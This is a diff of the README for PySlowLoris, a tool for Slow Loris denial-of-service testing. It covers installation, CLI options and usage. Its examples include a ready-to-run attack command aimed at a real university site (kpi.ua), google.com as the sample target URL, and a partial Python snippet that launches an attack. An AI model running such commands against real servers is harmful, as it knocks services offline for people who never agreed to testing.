@@ -3,9 +3,9 @@
 [![License](https://img.shields.io/badge/license-MIT%20license-orange.svg)](https://github.com/maxkrivich/SlowLoris/blob/master/LICENSE)
 [![Python](https://img.shields.io/badge/python-2.7-blue.svg)](https://github.com/maxkrivich/SlowLoris)
 [![Build Status](https://travis-ci.org/maxkrivich/SlowLoris.svg?branch=master)](https://travis-ci.org/maxkrivich/SlowLoris)
-[![Coverage Status](https://coveralls.io/repos/github/maxkrivich/SlowLoris/badge.svg?branch=master)](https://coveralls.io/github/maxkrivich/SlowLoris?branch=master)
 [![Requirements Status](https://requires.io/github/maxkrivich/SlowLoris/requirements.svg?branch=master)](https://requires.io/github/maxkrivich/SlowLoris/requirements/?branch=master)
 [![Code Health](https://landscape.io/github/maxkrivich/SlowLoris/master/landscape.svg?style=flat)](https://landscape.io/github/maxkrivich/SlowLoris/master)
+[![PyPI version](https://badge.fury.io/py/PySlowLoris.svg)](https://badge.fury.io/py/PySlowLoris)
 
 This repository was created for testing Slow Loris vulnerability on different web servers. SL based on keeping alive open connection as long as possible and sending some trash headers to the server. If you are interested what I'm trying doing here, please join my team and let's do fun together. Please DO NOT use this in the real attacks on the servers.
 
@@ -13,53 +13,70 @@ The main reason why I'm writing this module it is to create the easy tool for th
 
 More information you can find [here].
 
-### Install module
+### Installation
 
-##### PyPi
-Installing module form PyPi:
+#### PyPi
+
+To install PySlowLoris, run this command in your terminal:
+
 ```sh
 $ pip install pyslowloris
 ```
+This is the preferred method to install PySlowLoris, as it will always install the most recent stable release.
 
-##### Docker
-Pulling from Docker hub:
+
+#### Source files
+
+In case you downloaded or cloned the source code from [GitHub](https://github.com/maxkrivich/SlowLoris) or your own fork, you can run the following to install cameo for development:
+
+```sh
+$ git clone https://github.com/[username]/SlowLoris.git
+$ cd SlowLoris
+$ vitualenv --python=python[version] venv
+$ source venv/bin/active
+$ pip install --editable .
+```
+
+#### Docker Hub
+
+Pulling image from [Docker Hub](https://hub.docker.com/r/maxkrivich/pyslowloris/) and run container:
+
 ```sh
 $ docker pull maxkivich/pyslowloris
 $ docker run --rm -it maxkivich/pyslowloris [-h] [-u URL] [-p PORT] [-s SOCKET_COUNT]
 ```
 
-Build from Dockerfile:
+Also you can build image from [Dockerfile](https://github.com/maxkrivich/SlowLoris/blob/master/Dockerfile) and run container: 
+
 ```sh
 $ docker build -t pyslowloris .
 $ docker run --rm -it pyslowloris [-h] [-u URL] [-p PORT] [-s SOCKET_COUNT]
 ```
 
-##### For contributors
-```sh
-$ git clone https://github.com/maxkrivich/SlowLoris.git
-$ cd SlowLoris
-$ vitualenv --python=[python version] venv
-$ source venv/bin/active
-$ pip install --editable .
-```
+**Note:** *Don't forget about 'sudo'!*
 
-### Usage
+### Basic Usage
+
+Available command list:
+
 ```sh
+$ slowloris --help
 usage: slowloris [-h] [-u URL] [-s SOCKET_COUNT] [-p PORT]
 
-Small and simple tool for testing Slow Loris vulnerability @maxkrivich
+Small and simple tool for testing Slow Loris vulnerability
 
 optional arguments:
-  -h, --help            Show this help message and exit
-  -u URL, --url URL     Link to the web server (http://google.com) - str
-  -s SOCKET_COUNT, --socket-count SOCKET_COUNT Maximum count of created connection (default value
-                        300) - int
-  -p PORT, --port PORT  Port what will be used - int
+  -h                show this help message and exit
+  -u URL            link to the web server (http://google.com) - str
+  -s SOCKET_COUNT   maximum count of created connection (default value 300) - int
+  -p PORT           port what will be used - int
 
 ```
 
-##### Code example
-Here are some example to start attack via Python
+#### Using PySlowLoris from code
+
+Here are some example to start attack from Python code
+
 ```py
 import time
 from PySlowLoris import TargetInfo, SlowLorisAttack
@@ -74,21 +91,28 @@ while True:
 
 ```
 
-##### Using module via CLI
-The following command helps to use module via command line
+#### Using PySlowLoris from terminal
+
+The following command helps to use module from command line
+
 ```sh
 $ slowloris -u http://kpi.ua/ -s 300
 ```
-
-
 ###### stop execution: Ctrl + C
+
+
+### Bugs, issues and contributing
 
 If you find [bugs] or have [suggestions] about improving the module, don't hesitate to contact [me].
 
-### License
-Copyright (c) 2017 Maxim Krivich, [maxkrivich.github.io](https://maxkrivich.github.io/)
 
-Licensed under the MIT License
+### License
+
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/maxkrivich/SlowLoris/blob/master/LICENSE) file for details
+
+Copyright (c) 2017 Maxim Krivich
+
+[maxkrivich.github.io](https://maxkrivich.github.io/)
 
 
 
